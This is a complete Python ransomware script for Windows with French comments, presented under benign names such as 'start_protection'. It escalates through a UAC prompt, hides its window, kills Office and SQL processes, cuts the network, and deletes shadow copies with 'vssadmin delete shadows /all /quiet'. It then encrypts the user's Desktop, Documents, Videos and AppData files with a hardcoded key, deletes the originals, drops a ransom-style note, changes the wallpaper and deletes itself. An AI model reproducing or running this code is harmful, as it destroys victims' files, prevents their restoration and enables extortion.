import os
import sys
import ctypes
import subprocess
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
# Remplace cette clé par la tienne si nécessaire (doit être en base64)
HARDCODED_KEY = b'u_V8X6-T9pZ2_Wj5Yk_R8f_1vXm_4nE3pL6z8A_B4C0='
cipher = Fernet(HARDCODED_KEY)
EXTENSION = ".locked"
NOTE_NAME = "RECOVERY_INSTRUCTIONS.txt"

# Dossiers cibles
user_profile = os.environ.get('USERPROFILE')
TARGET_DIRS = [
    os.path.join(user_profile, 'Desktop'),
    os.path.join(user_profile, 'Documents'),
    os.path.join(user_profile, 'Videos'),
    os.path.join(user_profile, 'AppData', 'Roaming')
]

# --- FONCTIONS SYSTÈME ---

def resource_path(relative_path):
    """ Trouve le chemin de l'image une fois compilé en .exe """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def setup_environment():
    """ Tuer les process, couper le réseau et supprimer les sauvegardes """
    # 1. Kill apps (pour libérer les fichiers)
    apps = ["excel.exe", "winword.exe", "sqlserver.exe", "outlook.exe"]
    for app in apps:
        subprocess.run(f"taskkill /f /im {app}", shell=True, capture_output=True)
    
    # 2. Couper le réseau (Anti-exfiltration)
    subprocess.run("ipconfig /release", shell=True, capture_output=True)
    
    # 3. Supprimer les Shadow Copies (Anti-restauration)
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True, capture_output=True)

def set_wallpaper():
    """ Change le fond d'écran avec l'image intégrée """
    path = resource_path("alerte.jpg") # Ton image doit s'appeler alerte.jpg
    if os.path.exists(path):
        # 20 = SPI_SETDESKWALLPAPER
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

# --- CŒUR DU CHIFFREMENT ---

def secure_file(file_path):
    if file_path.endswith(EXTENSION) or NOTE_NAME in file_path:
        return
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        enc_data = cipher.encrypt(data)
        with open(file_path + EXTENSION, "wb") as f:
            f.write(enc_data)
        os.remove(file_path)
    except:
        pass

def start_protection():
    with ThreadPoolExecutor(max_workers=35) as executor:
        for target in TARGET_DIRS:
            if not os.path.exists(target): continue
            
            # Dépose la note
            try:
                with open(os.path.join(target, NOTE_NAME), "w") as f:
                    f.write("PROTECTION ACTIVE : Serveur verrouille pour securite.")
            except: pass

            for root, _, files in os.walk(target):
                for file in files:
                    executor.submit(secure_file, os.path.join(root, file))

# --- POINT D'ENTRÉE ---

if __name__ == "__main__":
    if not is_admin():
        # Relance avec les droits admin (UAC Prompt)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    # Cacher la console
    hWnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hWnd:
        ctypes.windll.user32.ShowWindow(hWnd, 0)

    # Exécution du protocole
    setup_environment()
    start_protection()
    set_wallpaper()
    
    # Auto-destruction (Batch discret)
    subprocess.Popen(f'choice /C Y /N /D Y /T 3 & Del "{sys.argv[0]}"', shell=True)